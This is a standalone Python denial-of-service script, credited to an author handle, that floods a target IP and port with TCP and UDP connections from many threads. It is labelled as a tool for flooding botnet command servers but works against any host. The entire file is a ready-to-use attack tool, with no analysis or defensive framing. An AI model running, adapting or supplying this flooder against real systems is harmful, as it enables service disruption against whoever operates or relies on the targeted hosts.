#!/usr/bin/python

import socket, os, sys, threading, time

if len(sys.argv) < 4:
	sys.exit("Usage: python "+sys.argv[0]+" <target> <port> <threads(1-20)>")

ip = str(sys.argv[1])
port = int(sys.argv[2])
threads = int(sys.argv[3])

def worker():
	try:
		while True:
			try:
				work = cnc_dos(ip)
				work.start()
				time.sleep(0.001)
			except:
				pass
	except:
		pass

class cnc_dos(threading.Thread):
	def __init__ (self, ip):
		threading.Thread.__init__(self)
		self.ip = ip
	def run(self):
		try:
			sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			sockudp = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
			sock.connect((self.ip,port))
			sockudp.connect((self.ip,port))
			time.sleep(6)
		except:
			pass

print(f"Success, Flooding CNC / IP : {ip} / Port : {port} Made By iOnly69 / IG : @x86.root")

for g in range(threads):
	try:
		donged = threading.Thread(target=worker)
		donged.start()
		time.sleep(0.5)
	except:
		pass